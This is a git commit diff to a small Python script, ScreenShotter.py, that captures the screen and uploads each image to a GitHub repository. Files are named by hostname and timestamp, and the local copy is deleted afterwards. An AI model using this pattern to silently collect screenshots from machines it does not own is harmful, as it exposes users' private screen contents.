eb31b5ed30a11361b406fb96366865b3ae89082e
Ali El khattabi <60844044+AliElkhattabi99@users.noreply.github.com>
2023-06-01 00:27:07 +0200

    Update ScreenShotter.py

--- ScreenShotter.py
+++ ScreenShotter.py
@@ -1,35 +1,31 @@
 import pyautogui
+import socket
+import os
+from datetime import datetime
 from Github import Github
 
 
-def capture_screenshot():
-    # Maak een schermafbeelding
-    screenshot = pyautogui.screenshot()
+class ScreenShotter:
+    def capture_screenshot():
+        screenshot = pyautogui.screenshot()
 
-    # Sla de schermafbeelding op als bestand
-    screenshot.save("screenshot.png")
-    print("Schermafbeelding gemaakt: screenshot.png")
+        screenshot.save("screenshot.png")
+        print("Schermafbeelding gemaakt: screenshot.png")
+
+    def upload_to_github():
+        github = Github()
+
+        with open("screenshot.png", "rb") as file:
+            content = file.read()
+            print("Schermafbeelding geüpload naar GitHub")
+            name = (
+                socket.gethostname()
+                + datetime.today().strftime("%Y-%m-%d %H:%M:%S")
+                + ".png"
+            )
+            github.save_to_repo("Screens/" + name, content)
+        os.remove("screenshot.png")
 
 
-def upload_to_github(file_path):
-    # Maak een GitHub-instantie met behulp van het persoonlijke toegangstoken
-    github = Github()
-
-    # Upload het bestand naar het repository
-    with open(file_path, "rb") as file:
-        content = file.read()
-        commit_message = f"Upload screenshot: {file_path}"
-        print("Schermafbeelding geüpload naar GitHub")
-        github.save_to_repo("screenshot.png", content)
-
-
-# Roep de functie aan om een schermafbeelding te maken
-capture_screenshot()
-upload_to_github("screenshot.png")
-
-# Upload de schermafbeelding naar GitHub
-"""repo_owner = "gebruikersnaam"
-repo_name = "repositorynaam"
-file_path = "screenshot.png"
-github_token = "jouw_persoonlijke_toegangstoken"
-upload_to_github(repo_owner, repo_name, file_path, github_token)"""
+ScreenShotter.capture_screenshot()
+ScreenShotter.upload_to_github()
